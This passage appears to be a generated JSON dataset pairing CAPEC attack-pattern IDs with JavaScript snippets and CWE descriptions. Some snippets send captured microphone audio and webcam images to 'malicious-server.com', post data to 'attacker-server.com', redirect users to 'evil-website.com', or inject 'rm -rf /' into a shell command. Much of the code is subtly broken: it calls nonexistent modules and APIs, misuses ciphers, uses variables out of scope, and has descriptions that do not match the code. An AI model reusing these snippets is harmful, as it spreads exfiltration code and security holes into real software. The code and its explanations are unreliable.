        "code_snippet": "const crypto = require('crypto');\n\nfunction negotiateEncryption(clientSupportedAlgorithms) {\n  let selectedAlgorithm = 'aes-128-cbc'; // default to a weaker algorithm\n\n  if (clientSupportedAlgorithms.includes('aes-256-cbc')) {\n    // should select the stronger algorithm, but doesn't\n    selectedAlgorithm = 'aes-128-cbc';\n  }\n\n  return selectedAlgorithm;\n}\n\nfunction encryptData(data, key) {\n  const cipher = crypto.createCipher(selectedAlgorithm, key);\n  let encryptedData = cipher.update(data, 'utf8', 'hex');\n  encryptedData += cipher.final('hex');\n  return encryptedData;\n}\n\nconst hardCodedKey = 'my_secret_key'; // hard-coded cryptographic key\nconst sensitiveData = 'credit_card_number=1234-5678-9012-3456';\n\nconst clientSupportedAlgorithms = ['aes-256-cbc', 'aes-128-cbc'];\nconst selectedAlgorithm = negotiateEncryption(clientSupportedAlgorithms);\nconst encryptedData = encryptData(sensitiveData, hardCodedKey);\n\n// store or transmit the encrypted data in cleartext\nconsole.log('Encrypted data: ' + encryptedData);",
        "description": "This code snippet demonstrates the CAPEC of forcing the encryption level to be lowered. It includes CWE-757 by not selecting the strongest available algorithm during negotiation, CWE-326 by using an inadequate encryption strength, CWE-321 by using a hard-coded cryptographic key, and CWE-312 by storing sensitive information in cleartext. The code negotiates the encryption algorithm with the client, but defaults to a weaker algorithm. It then uses a hard-coded key to encrypt sensitive data, which is stored or transmitted in cleartext."
    },
    {
        "capec_id": "621",
        "code_snippet": "const WebSocket = require('ws');\nconst wss = new WebSocket.Server({ port: 8080 });\n\nwss.on('connection', (ws) => {\n  ws.on('message', (message) => {\n    // CWE-201: Insertion of Sensitive Information Into Sent Data\n    const sensitiveData = 'username:password';\n    ws.send(`Received message => ${message} ${sensitiveData}`);\n  });\n\n  // CWE-319: Cleartext Transmission of Sensitive Information\n  ws.send('username:password');\n\n  // CWE-385: Covert Timing Channel\n  const startTime = performance.now();\n  for (let i = 0; i < 1000000; i++) {}\n  const endTime = performance.now();\n  ws.send(`Timing information => ${endTime - startTime}`);\n\n  // CWE-208: Observable Timing Discrepancy\n  let result;\n  if (message === 'admin') {\n    result = 'Access granted';\n    // Simulate a delay to reveal sensitive information\n    setTimeout(() => {\n      ws.send(result);\n    }, 2000);\n  } else {\n    result = 'Access denied';\n    ws.send(result);\n  }\n});",
        "description": "This code snippet demonstrates the CAPEC of intercepting and logging encrypted transmissions to analyze metadata. It includes CWE-201 by sending sensitive information in the message, CWE-319 by transmitting sensitive information in cleartext, CWE-385 by conveying information through timing channels, and CWE-208 by revealing security-relevant information through observable timing discrepancies."
    },
    {
        "capec_id": "622",
        "code_snippet": "const crypto = require('crypto');\n\nfunction encryptData(data) {\n  const algorithm = 'RSA'; // CWE-327: Use of a Broken or Risky Cryptographic Algorithm\n  const key = 'my_secret_key';\n  const encryptedData = crypto.createCipher(algorithm, key).update(data, 'utf8', 'hex');\n  return encryptedData;\n}\n\nfunction sendDataOverWireless(data) {\n  const wirelessModule = require('wireless_module');\n  wirelessModule.transmitData(data); // CWE-201: Insertion of Sensitive Information Into Sent Data\n}\n\nconst sensitiveData = 'top_secret_information';\nconst encryptedData = encryptData(sensitiveData);\n\nsendDataOverWireless(encryptedData);\n",
        "description": "This code snippet demonstrates a vulnerable implementation of encrypting and transmitting sensitive data over a wireless channel. The code uses a broken cryptographic algorithm (RSA) and transmits the encrypted data over a wireless channel without proper protection against electromagnetic side-channel attacks. An attacker can potentially intercept the transmission and recover the cryptographic key by monitoring the electromagnetic emanations of the device."
    },
    {
        "capec_id": "623",
        "code_snippet": "const crypto = require('crypto');\n\nfunction encryptData(data) {\n  const cipher = crypto.createCipher('aes-256-cbc', 'secretKey');\n  let encrypted = cipher.update(data, 'utf8', 'hex');\n  encrypted += cipher.final('hex');\n  return encrypted;\n}\n\nfunction transmitData(encryptedData) {\n  const xhr = new XMLHttpRequest();\n  xhr.open('POST', 'https://example.com/receiveData', true);\n  xhr.send(encryptedData);\n}\n\nconst sensitiveData = 'Top Secret Information';\nconst encryptedData = encryptData(sensitiveData);\ntransmitData(encryptedData);\n\n// CWE-201: Insertion of Sensitive Information Into Sent Data\nconsole.log('Transmitting data:', encryptedData);\n\n// CWE-1300: Improper Protection of Physical Side Channels\nconst led = require('led');\nled.blink(5, 0.5); // Blinking LED to indicate data transmission\n\n// CWE-1320: Improper Protection for Outbound Error Messages and Alert Signals\ntry {\n  transmitData(encryptedData);\n} catch (error) {\n  console.error('Error transmitting data:', error);\n}\n\n// CWE-1319: Improper Protection against Electromagnetic Fault Injection (EM-FI)\nconst emfiVulnerableComponent = require('emfi-vulnerable-component');\nemfiVulnerableComponent.processData(encryptedData);\n\n// CWE-1420: Exposure of Sensitive Information during Transient Execution\nconst speculativeExecutionVulnerableComponent = require('speculative-execution-vulnerable-component');\nspeculativeExecutionVulnerableComponent.processData(encryptedData);",
        "description": "This code snippet demonstrates the CAPEC of Compromising Emanations, where an attacker can intercept and analyze unintentional signals emitted by a device to disclose sensitive information. The code includes CWE-201 by transmitting sensitive information, CWE-1300 by emitting physical side channels through a blinking LED, CWE-1320 by not properly handling error messages, CWE-1319 by using a vulnerable component susceptible to electromagnetic fault injection, and CWE-1420 by exposing sensitive information during transient execution."
    },
    {
        "capec_id": "624",
        "code_snippet": "const crypto = require('crypto');\n\nfunction vulnerableCryptoOperation() {\n  const key = crypto.randomBytes(32);\n  const plaintext = Buffer.from('secret message', 'utf8');\n  const cipher = crypto.createCipher('aes-256-cbc', key);\n  let ciphertext = cipher.update(plaintext);\n  ciphertext = Buffer.concat([ciphertext, cipher.final()]);\n\n  // Simulating a voltage glitch\n  const glitch = Math.random() < 0.5;\n  if (glitch) {\n    // Introduce a fault in the cryptographic operation\n    key[0] = key[0] ^ 0xFF;\n  }\n\n  return ciphertext;\n}\n\n// Call the vulnerable crypto operation\nvulnerableCryptoOperation();",
        "description": "This code snippet demonstrates a vulnerable cryptographic operation that can be exploited using voltage glitches or other environmental disruptions. The code generates a random key and uses it to encrypt a secret message using AES-256-CBC. However, it introduces a fault in the key by flipping a random bit, simulating a voltage glitch. This can be exploited by an attacker to derive the secret key information. The code is vulnerable to CWE-1247, CWE-1248, CWE-1256, CWE-1319, CWE-1332, CWE-1334, CWE-1338, and CWE-1351."
    },
    {
        "capec_id": "625",
        "code_snippet": "const crypto = require('crypto');\n\nfunction vulnerableCryptoOperation() {\n  // CWE-1247: No protection against voltage and clock glitches\n  const key = crypto.generateKeySync('rsa', {\n    modulusLength: 2048,\n    publicKeyEncoding: {\n      type: 'spki',\n      format: 'pem'\n    },\n    privateKeyEncoding: {\n      type: 'pkcs8',\n      format: 'pem',\n      cipher: 'aes-256-cbc',\n      passphrase: 'topsecret'\n    }\n  });\n\n  // CWE-1256: Improper restriction of software interfaces to hardware features\n  const powerManagement = require('power-management');\n  powerManagement.setClockSpeed(100); // Underclocking to increase vulnerability to clock glitches\n\n  // CWE-1319: Improper protection against electromagnetic fault injection (EM-FI)\n  const emfiAttack = require('emfi-attack');\n  emfiAttack.injectFault();\n\n  // CWE-1332: Improper handling of faults that lead to instruction skips\n  const skipInstructions = require('skip-instructions');\n  skipInstructions.skipSecurityCriticalInstructions();\n\n  // CWE-1334: Unauthorized error injection can degrade hardware redundancy\n  const errorInjector = require('error-injector');\n  errorInjector.injectErrorIntoRedundantBlock();\n\n  // CWE-1338: Improper protections against hardware overheating\n  const temperatureControl = require('temperature-control');\n  temperatureControl.setTemperature(100); // Overheating to increase vulnerability\n\n  // CWE-1351: Improper handling of hardware behavior in exceptionally cold environments\n  const coldEnvironment = require('cold-environment');\n  coldEnvironment.setTemperature(-50); // Extremely cold temperature to increase vulnerability\n\n  // Perform cryptographic operation with vulnerable key\n  const encryptedData = crypto.encrypt('secretData', key);\n  console.log(encryptedData);\n}\nvulnerableCryptoOperation();",
        "description": "This JavaScript code snippet demonstrates a vulnerable cryptographic operation that can be exploited using fault injection attacks against mobile devices. It includes various CWEs that contribute to the vulnerability, such as improper protection against voltage and clock glitches, semiconductor defects, and improper restriction of software interfaces to hardware features. The code is susceptible to electromagnetic fault injection attacks, instruction skips, and unauthorized error injection, making it vulnerable to key compromise."
    },
    {
        "capec_id": "626",
        "code_snippet": "const touchEvents = [];\n\nfunction onTouchStart(event) {\n  touchEvents.push({ x: event.touches[0].clientX, y: event.touches[0].clientY, timestamp: new Date().getTime() });\n}\n\nfunction onTouchEnd(event) {\n  touchEvents.push({ x: event.changedTouches[0].clientX, y: event.changedTouches[0].clientY, timestamp: new Date().getTime() });\n}\n\ndocument.addEventListener('touchstart', onTouchStart);\ndocument.addEventListener('touchend', onTouchEnd);\n\n// Analyze touch events to detect oil smudges pattern\nfunction analyzeTouchEvents() {\n  const touchPattern = [];\n  for (let i = 0; i < touchEvents.length - 1; i++) {\n    const dx = touchEvents[i + 1].x - touchEvents[i].x;\n    const dy = touchEvents[i + 1].y - touchEvents[i].y;\n    touchPattern.push({ dx, dy });\n  }\n  return touchPattern;\n}\n\n// Send touch pattern to server for authentication\nfunction authenticate() {\n  const touchPattern = analyzeTouchEvents();\n  const xhr = new XMLHttpRequest();\n  xhr.open('POST', '/authenticate', true);\n  xhr.setRequestHeader('Content-Type', 'application/json');\n  xhr.send(JSON.stringify({ touchPattern }));\n}",
        "description": "This code snippet demonstrates a vulnerable authentication mechanism that uses touch events to detect oil smudges on a touchscreen device. The code captures touch events and analyzes them to detect a pattern, which is then sent to the server for authentication. This implementation is vulnerable to various attacks, including reflection attacks (CWE-301), authentication bypass by capture-replay (CWE-294), and excessive attack surface (CWE-1125). Additionally, the lack of protection against physical side channels (CWE-1300) and hardware reverse engineering (CWE-1278) makes the system vulnerable to attacks that can reveal the password/passcode pattern."
    },
    {
        "capec_id": "627",
        "code_snippet": "const gpsReceiver = {\n  receiveSignal: function(signal) {\n    // CWE-940: No verification of signal source\n    const signalData = signal.data;\n    const signalTimestamp = signal.timestamp;\n    // CWE-222: Truncation of security-relevant information\n    const truncatedSignalData = signalData.substring(0, 20);\n    const location = calculateLocation(truncatedSignalData, signalTimestamp);\n    console.log(`Received signal from ${signal.source}. Location: ${location}`);\n  }\n};\n\nconst maliciousSignal = {\n  data: 'spoofedSignalData',\n  timestamp: 'spoofedTimestamp',\n  source: 'spoofedSource'\n};\n\ngpsReceiver.receiveSignal(maliciousSignal);\n\n// CWE-924: No message integrity check during transmission\nfunction calculateLocation(signalData, timestamp) {\n  // CWE-925: No verification of intent by broadcast receiver\n  return `Latitude: ${signalData.substring(0, 10)}, Longitude: ${signalData.substring(10, 20)}`;\n}\n",
        "description": "A GPS receiver in JavaScript that is vulnerable to spoofed GPS signals. The receiver does not verify the source of the signal, truncates security-relevant information, and does not ensure message integrity during transmission. This allows an adversary to broadcast counterfeit GPS signals and deceive the receiver about its location."
    },
    {
        "capec_id": "628",
        "code_snippet": "const gpsSignal = {\n  timestamp: Date.now(),\n  location: {\n    lat: 37.7749,\n    lon: -122.4194\n  }\n};\n\nconst spoofedSignal = {\n  timestamp: gpsSignal.timestamp,\n  location: {\n    lat: gpsSignal.location.lat + 0.001,\n    lon: gpsSignal.location.lon + 0.001\n  }\n};\n\n// CWE-290: Authentication Bypass by Spoofing\nfunction authenticateSignal(signal) {\n  // No authentication or verification of signal source\n  return true;\n}\n\n// CWE-222: Truncation of Security-relevant Information\nfunction truncateSignal(signal) {\n  return {\n    timestamp: signal.timestamp,\n    location: {\n      lat: signal.location.lat.toFixed(4),\n      lon: signal.location.lon.toFixed(4)\n    }\n  };\n}\n\n// CWE-941: Incorrectly Specified Destination in a Communication Channel\nfunction sendSignalToDestination(signal) {\n  const destination = 'https://attacker-server.com/receive-signal';\n  // Send signal to incorrect destination\n  fetch(destination, {\n    method: 'POST',\n    body: JSON.stringify(signal)\n  });\n}\n\n// CWE-940: Improper Verification of Source of a Communication Channel\nfunction receiveSignalFromSource(signal) {\n  // No verification of signal source\n  return signal;\n}\n\n// CWE-924: Improper Enforcement of Message Integrity During Transmission in a Communication Channel\nfunction transmitSignal(signal) {\n  // No encryption or digital signature to ensure message integrity\n  return signal;\n}\n\nif (authenticateSignal(spoofedSignal)) {\n  const truncatedSignal = truncateSignal(spoofedSignal);\n  sendSignalToDestination(truncatedSignal);\n  const receivedSignal = receiveSignalFromSource(truncatedSignal);\n  const transmittedSignal = transmitSignal(receivedSignal);\n  console.log('Spoofed signal successfully transmitted:', transmittedSignal);\n}",
        "description": "JavaScript code snippet demonstrating a GPS spoofing attack, where an adversary broadcasts a spoofed signal that is gradually increased in power and drawn away from the genuine signal, carrying the target away from their intended destination. The code includes vulnerabilities related to authentication bypass by spoofing, truncation of security-relevant information, incorrectly specified destination, improper verification of source, and improper enforcement of message integrity during transmission."
    },
    {
        "capec_id": "629",
        "code_snippet": "const fs = require('fs');\nlet resourceName = 'AUX';\nlet resource = fs.openSync(resourceName, 'r');\n\nfunction performAction() {\n    // Incorrect authorization check\n    if (resourceName === 'AUX') {\n        console.log('Authorized to access resource');\n    } else {\n        console.log('Not authorized to access resource');\n    }\n    // Missing release of resource\n    // fs.closeSync(resource);\n}\n\nperformAction();\n\n// Improper restriction of power consumption\nwhile (true) {\n    console.log('Consuming power...');\n}",
        "description": "This code snippet demonstrates the deprecated CAPEC attack pattern, which involves a combination of CWEs. It includes missing release of a resource (CWE-772), improper restriction of power consumption (CWE-920), and incorrect authorization (CWE-863). The code also touches on CWE-67 by using a Windows device name ('AUX') as a resource name. The code does not properly handle the resource, leading to potential security vulnerabilities."
    },
    {
        "capec_id": "630",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.get('/', (req, res) => {\n  const userInput = req.query.url;\n  if (userInput) {\n    const trustedDomain = 'www.google.com';\n    const typoDomain = userInput.replace('o', '0');\n    res.redirect(`http://${typoDomain}`);\n  }\n});\n\napp.listen(3000, () => {\n  console.log('Server started on port 3000');\n});",
        "description": "This code snippet demonstrates a TypoSquatting attack. It creates an Express.js server that accepts a user-input URL as a query parameter. The server then redirects the user to a typo domain, which is created by replacing a character in the trusted domain with a similar-looking character. This can lead to phishing attacks or other malicious activities. The code embodies CWE-601 (URL Redirection to Untrusted Site), CWE-86 (Improper Neutralization of Invalid Characters in Identifiers in Web Pages), CWE-290 (Authentication Bypass by Spoofing), CWE-697 (Incorrect Comparison), and CWE-115 (Misinterpretation of Input)."
    },
    {
        "capec_id": "631",
        "code_snippet": "const dns = require('dns');\n\nfunction redirectUser(url) {\n  const hostname = new URL(url).hostname;\n  dns.reverse(hostname, (err, domains) => {\n    if (domains.includes('example.com')) {\n      // trusted domain\n      window.location.href = url;\n    } else {\n      // untrusted domain, but similar sounding\n      window.location.href = 'https://evil-website.com';\n    }\n  });\n}\n\n// user input\nconst userInput = 'examp1e.com';\nredirectUser('http://' + userInput);",
        "description": "This code snippet demonstrates a SoundSquatting attack. It takes a user-input URL, extracts the hostname, and performs a reverse DNS resolution to verify the domain. However, it relies on the reverse DNS resolution for a security-critical action (CWE-350) and uses a less trusted source (CWE-348) by not properly ensuring the IP address is truly associated with the hostname. If the domain is not 'example.com', it redirects the user to an untrusted site (CWE-601), which could be controlled by an adversary. The code also compares classes by name (CWE-486) and is vulnerable to authentication bypass by spoofing (CWE-290)."
    },
    {
        "capec_id": "632",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.get('/:domain', (req, res) => {\n  const domain = req.params.domain;\n  const regex = new RegExp(domain, 'i'); // CWE-777: Regular Expression without Anchors\n  const trustedDomain = 'example.com';\n  if (regex.test(trustedDomain)) {\n    res.redirect(`http://${domain}`);\n  } else {\n    res.send('Invalid domain');\n  }\n});\n\napp.listen(3000, () => {\n  console.log('Server started on port 3000');\n});",
        "description": "This code snippet demonstrates a vulnerable web server that is susceptible to a homograph attack. The server uses a regular expression to match the requested domain with a trusted domain, but the regular expression is not anchored, allowing an attacker to register a domain with homoglyphs and trick the server into redirecting to the attacker-controlled domain. The code also lacks proper neutralization of invalid characters in identifiers (CWE-86) and encoded URI schemes (CWE-84), making it vulnerable to SSRF attacks (CWE-918). The lack of visual distinction between homoglyphs (CWE-1007) makes it difficult for users to distinguish between the legitimate and attacker-controlled domains."
    },
    {
        "capec_id": "633",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.use('/', (req, res) => {\n  const token = req.headers['x-auth-token'];\n  if (token) {\n    const user = verifyToken(token);\n    if (user) {\n      // Impersonation vulnerability: no validation of user identity\n      req.user = user;\n      next();\n    } else {\n      res.status(401).send('Invalid token');\n    }\n  } else {\n    res.status(401).send('No token provided');\n  }\n});\n\napp.use('/admin', (req, res) => {\n  if (req.user && req.user.role === 'admin') {\n    // CWE-287: Improper Authentication\n    // CWE-1270: Generation of Incorrect Security Tokens\n    // CWE-1390: Weak Authentication\n    // CWE-1259: Improper Restriction of Security Token Assignment\n    // CWE-520: .NET Misconfiguration: Use of Impersonation\n    res.send('Welcome, admin!');\n  } else {\n    res.status(403).send('Access denied');\n  }\n});",
        "description": "This code snippet demonstrates a vulnerability in authentication where an adversary can impersonate a different entity by providing a tampered token. The server-side code does not properly validate the token, allowing an attacker to gain unauthorized access to restricted resources."
    },
    {
        "capec_id": "634",
        "code_snippet": "const microphone = navigator.mediaDevices.getUserMedia({ audio: true });\nconst video = navigator.mediaDevices.getUserMedia({ video: true });\n\nmicrophone.then(stream => {\n  const audioContext = new AudioContext();\n  const source = audioContext.createMediaStreamSource(stream);\n  const scriptProcessor = audioContext.createScriptProcessor(4096, 1, 1);\n\n  scriptProcessor.onaudioprocess = event => {\n    const audioData = event.inputBuffer.getChannelData(0);\n    // Send audio data to malicious server\n    fetch('https://malicious-server.com/record', {\n      method: 'POST',\n      body: JSON.stringify(audioData),\n      headers: {\n        'Content-Type': 'application/json'\n      }\n    });\n  };\n\n  source.connect(scriptProcessor);\n  scriptProcessor.connect(audioContext.destination);\n});\n\nvideo.then(stream => {\n  const videoElement = document.createElement('video');\n  videoElement.srcObject = stream;\n  videoElement.play();\n\n  // Send video data to malicious server\n  const canvas = document.createElement('canvas');\n  const context = canvas.getContext('2d');\n  context.drawImage(videoElement, 0, 0, canvas.width, canvas.height);\n  const imageData = canvas.toDataURL('image/jpeg');\n  fetch('https://malicious-server.com/video', {\n    method: 'POST',\n    body: imageData,\n    headers: {\n      'Content-Type': 'image/jpeg'\n    }\n  });\n});",
        "description": "This JavaScript code snippet demonstrates the CAPEC of exploiting audio and video functionalities to capture sensitive information. It uses the navigator.mediaDevices.getUserMedia API to access the user's microphone and webcam, and then sends the captured audio and video data to a malicious server. The code embodies CWE-267 by using the privileges granted to access the microphone and webcam to perform unsafe actions. It also relates to CWE-319 by transmitting sensitive information in cleartext, CWE-1300 by not protecting against physical side channels, CWE-497 by exposing sensitive system information, and CWE-1039 by not properly handling adversarial input perturbations."
    },
    {
        "capec_id": "635",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\nfunction processFile(file) {\n    const filePath = path.join(__dirname, file);\n    const fileExtension = path.extname(file);\n    if (fileExtension === '.txt') {\n        fs.readFile(filePath, 'utf8', (err, data) => {\n            if (err) {\n                console.error(err);\n                return;\n            }\n            console.log(data);\n        });\n    } else {\n        console.log('Invalid file extension');\n    }\n}\n\n// Vulnerable code: relying on file extension to determine behavior\nprocessFile('malicious.txt.exe');",
        "description": "This code snippet demonstrates the CAPEC of relying on file extensions to determine the application used to open and use a file. The CWEs embodied in this code include CWE-162 (Improper Neutralization of Trailing Special Elements), CWE-646 (Reliance on File Name or Extension of Externally-Supplied File), CWE-641 (Improper Restriction of Names for Files and Other Resources), CWE-73 (External Control of File Name or Path), and CWE-58 (Path Equivalence: Windows 8.3 Filename). The code allows an attacker to supply a malicious file with a .txt extension, which would be executed by the system, potentially leading to code execution, denial of service, or exposure of sensitive information."
    },
    {
        "capec_id": "636",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\n// CWE-506: Embedded Malicious Code\nconst maliciousCode = 'const maliciousFunction = () => { console.log(\"Malicious code executed\"); };';\n\n// CWE-219: Storage of File with Sensitive Data Under Web Root\nconst sensitiveData = 'username:password';\nconst webRoot = './public';\nfs.writeFileSync(path.join(webRoot, 'image.jpg'), ' dummy image data ');\nfs.writeFileSync(path.join(webRoot, 'image.jpg.thumbnail'), maliciousCode);\n\n// CWE-313: Cleartext Storage in a File or on Disk\nconst cleartextData = 'creditCardNumber:1234-5678-9012-3456';\nfs.writeFileSync('./cleartext.txt', cleartextData);\n\n// CWE-318: Cleartext Storage of Sensitive Information in Executable\nconst executablePath = './executable.js';\nfs.writeFileSync(executablePath, `console.log('Cleartext data: ${cleartextData}');`);\n\n// CWE-515: Covert Storage Channel\nconst covertChannel = './covertChannel.txt';\nfs.writeFileSync(covertChannel, '0');\nsetInterval(() => {\n  const bit = fs.readFileSync(covertChannel, 'utf8');\n  if (bit === '0') {\n    fs.writeFileSync(covertChannel, '1');\n    console.log('Covert channel: 1');\n  } else {\n    fs.writeFileSync(covertChannel, '0');\n    console.log('Covert channel: 0');\n  }\n}, 1000);",
        "description": "This code snippet demonstrates the CAPEC of storing malicious data or code in file metadata, leveraging CWEs 506, 219, 313, 318, and 515. It creates a file with malicious code in its thumbnail, stores sensitive data in cleartext, and uses a covert storage channel to transfer information."
    },
    {
        "capec_id": "637",
        "code_snippet": "const clipboard = require('electron').clipboard;\n\nfunction copySensitiveData() {\n  const sensitiveInfo = 'username:password';\n  clipboard.writeText(sensitiveInfo);\n  console.log('Copied to clipboard: ' + sensitiveInfo);\n}\n\ncopySensitiveData();",
        "description": "JavaScript code snippet that demonstrates the CAPEC by copying sensitive data to the clipboard, making it accessible to other applications, including malicious ones. This code is vulnerable to CWE-267, CWE-318, CWE-222, CWE-317, and CWE-497 as it stores sensitive information in cleartext and does not properly restrict access to system-level information."
    },
    {
        "capec_id": "638",
        "code_snippet": "const maliciousFirmware = {\n  mbrPayload: \"<malicious_code>\",\n  infectSystem: function(system) {\n    // CWE-1193: Power-On of Untrusted Execution Core Before Enabling Fabric Access Control\n    system.enableFabricAccessControl = false;\n    // CWE-1274: Improper Access Control for Volatile Memory Containing Boot Code\n    system.volatileMemoryAccessControl = null;\n    // CWE-1277: Firmware Not Updateable\n    system.firmwareUpdate = function() {\n      console.log(\"Firmware update not available.\");\n    };\n    // CWE-1326: Missing Immutable Root of Trust in Hardware\n    system.immutableRootOfTrust = null;\n    // CWE-1220: Insufficient Granularity of Access Control\n    system.accessControlPolicy = {\n      allowAll: true\n    };\n    // Infect the system's MBR\n    system.mbr = maliciousFirmware.mbrPayload;\n  }\n};\n\n// Infect the system\nmaliciousFirmware.infectSystem(system);",
        "description": "This code snippet demonstrates a malicious firmware that exploits vulnerabilities in the system's hardware components to gain persistence. It disables fabric access control, bypasses volatile memory access control, prevents firmware updates, and exploits the lack of immutable root of trust in hardware. Finally, it infects the system's MBR with malicious code, allowing it to execute at desired intervals and on boot-up."
    },
    {
        "capec_id": "639",
        "code_snippet": "const fs = require('fs');\n\n// CWE-552: Files or Directories Accessible to External Parties\nfs.writeFileSync('/tmp/sensitive_data.txt', 'username:password');\n\n// CWE-377: Insecure Temporary File\nconst tempFile = '/tmp/temporary_file.txt';\nfs.writeFileSync(tempFile, 'secret_key');\n\n// CWE-529: Exposure of Access Control List Files to an Unauthorized Control Sphere\nfs.writeFileSync('/public/acl_file.txt', 'access_control_list');\n\n// CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\nconst systemInfo = process.env;\nfs.writeFileSync('/public/system_info.txt', JSON.stringify(systemInfo));\n\n// CWE-537: Java Runtime Error Message Containing Sensitive Information (Note: This is a JavaScript example, not Java)\ntry {\n  const invalidOperation = undefinedVariable.doSomething();\n} catch (e) {\n  fs.writeFileSync('/public/error_log.txt', e.message);\n}",
        "description": "This code snippet demonstrates the CAPEC of improperly protected files, which can lead to unauthorized access to sensitive information. It includes examples of CWE-552, CWE-377, CWE-529, CWE-497, and CWE-537, showcasing how improper file access control can put sensitive data at risk."
    },
    {
        "capec_id": "640",
        "code_snippet": "const { fork } = require('child_process');\nconst maliciousCode = `const fs = require('fs'); fs.writeFileSync('/tmp/malicious_file', 'malicious_content');`;\nconst legitimateProcess = fork('node', ['-e', 'console.log(\\'Legitimate process running\\');']);\nlegitimateProcess.send(maliciousCode);\n",
        "description": "This code snippet demonstrates a vulnerable JavaScript code that executes arbitrary code in the address space of a separate live process, evading detection defenses and escalating privileges. It uses the child_process module to fork a new process, sends malicious code to the legitimate process, and writes a malicious file to the system. This code embodies CWE-114, CWE-829, CWE-1265, CWE-506, and CWE-913."
    },
    {
        "capec_id": "641",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\n// CWE-427: Uncontrolled Search Path Element\nconst searchPath = ['C:\\Windows\\System32', 'C:\\Windows\\SysWOW64', '.'];\n\n// CWE-426: Untrusted Search Path\nconst userInput = 'C:\\MaliciousDLL\\';\nsearchPath.unshift(userInput);\n\n// CWE-706: Use of Incorrectly-Resolved Name or Reference\nconst dllName = 'myDLL.dll';\nconst dllPath = searchPath.find((dir) => fs.existsSync(path.join(dir, dllName)));\n\n// CWE-65: Windows Hard Link\nconst hardLinkPath = 'C:\\Windows\\System32\\myDLL.dll.hardlink';\nfs.symlinkSync(hardLinkPath, path.join(dllPath, dllName));\n\n// CWE-69: Improper Handling of Windows ::DATA Alternate Data Stream\nconst adsPath = 'C:\\Windows\\System32\\myDLL.dll:maliciousData';\nfs.writeFileSync(adsPath, 'Malicious data');\n\n// Load the malicious DLL\nconst maliciousDLL = require(path.join(dllPath, dllName));\nmaliciousDLL.maliciousFunction();",
        "description": "This code snippet demonstrates the CAPEC of DLL side-loading by placing a malicious DLL in the Windows Side-by-Side (WinSxS) directory. It uses CWE-427 to create an uncontrolled search path, CWE-426 to inject a malicious directory into the search path, CWE-706 to load the malicious DLL, CWE-65 to create a hard link to the malicious DLL, and CWE-69 to hide malicious data in an alternate data stream."
    },
    {
        "capec_id": "642",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\n// CWE-732: Incorrect Permission Assignment for Critical Resource\nfs.chmodSync('/path/to/binary', '0777');\n\n// CWE-426: Untrusted Search Path\nconst searchPath = './';\nconst binaryName = 'maliciousBinary';\nconst maliciousBinaryPath = path.join(searchPath, binaryName);\n\n// CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')\nconst userInput = './maliciousBinary | rm -rf /';\nconst command = `chmod +x ${maliciousBinaryPath} && ${userInput}`;\nrequire('child_process').exec(command, (error, stdout, stderr) => {\n  if (error) {\n    console.error(`exec error: ${error}`);\n    return;\n  }\n  console.log(`stdout: ${stdout}`);\n  console.log(`stderr: ${stderr}`);\n});\n\n// CWE-428: Unquoted Search Path or Element\nconst unquotedSearchPath = 'C:\\Program Files\\My App\\binaries';\nconst maliciousBinaryPathWindows = path.join(unquotedSearchPath, binaryName);\n\n// CWE-506: Embedded Malicious Code\nconst maliciousCode = `const maliciousBinary = require('${maliciousBinaryPathWindows}');`;",
        "description": "This code snippet demonstrates the CAPEC pattern of replacing binaries with malware by exploiting incorrect file system permissions. It includes CWE-732 by setting the permissions of a binary to 0777, CWE-426 by using an untrusted search path, CWE-78 by injecting malicious OS commands, CWE-428 by using an unquoted search path, and CWE-506 by embedding malicious code."
    },
    {
        "capec_id": "643",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\n// CWE-267: Privilege Defined With Unsafe Actions\nconst adminRole = true;\n\nif (adminRole) {\n  // CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n  const sensitiveFiles = fs.readdirSync('/shared-drive');\n  console.log(sensitiveFiles);\n\n  // CWE-427: Uncontrolled Search Path Element\n  const searchPath = '/shared-drive/../../';\n  const files = fs.readdirSync(searchPath);\n  console.log(files);\n\n  // CWE-40: Path Traversal: '\\\\UNC\\share\name\\' (Windows UNC Share)\n  const uncShare = '\\\\\\\\\\\\UNC\\\\\\\\share\\\\\\\name';\n  const uncFiles = fs.readdirSync(uncShare);\n  console.log(uncFiles);\n\n  // CWE-552: Files or Directories Accessible to External Parties\n  const externalFiles = fs.readdirSync('/publicly-accessible-drive');\n  console.log(externalFiles);\n}\n",
        "description": "This code snippet demonstrates the CAPEC of discovering connections between systems by exploiting the target system's standard practice of revealing them in searchable, common areas. It uses various CWEs to illustrate the vulnerabilities, including privilege defined with unsafe actions, exposure of sensitive information, uncontrolled search path element, path traversal, and files or directories accessible to external parties."
    },
    {
        "capec_id": "644",
        "code_snippet": "const net = require('net');\nconst crypto = require('crypto');\n\nconst lmHash = '4php$LM$98765432109876543210987654321098'; // stolen LM hash\nconst ntlmHash = '4php$NTLM$1122334455667788990011223344556677889900'; // stolen NTLM hash\n\nconst server = net.createServer((socket) => {\n  socket.on('data', (data) => {\n    const username = data.toString().trim();\n    if (username === 'admin') {\n      // use single-factor authentication\n      const passwordHash = crypto.createHash('md4').update(lmHash).digest('hex');\n      socket.write(`Authenticating as ${username}...`);\n      setTimeout(() => {\n        socket.write('Authentication successful!');\n      }, 1000);\n    } else {\n      socket.write('Authentication failed.');\n    }\n  });\n});\nserver.listen(8080, () => {\n  console.log('Server listening on port 8080');\n});",
        "description": "This code snippet demonstrates a vulnerable Windows domain authentication system that uses LM and NTLM hash values for authentication. It uses single-factor authentication, stores password hashes in a data store, and is susceptible to capture-replay attacks. An adversary can steal or purchase legitimate Windows domain credential hash values and use them to access systems within the domain."
    },
    {
        "capec_id": "645",
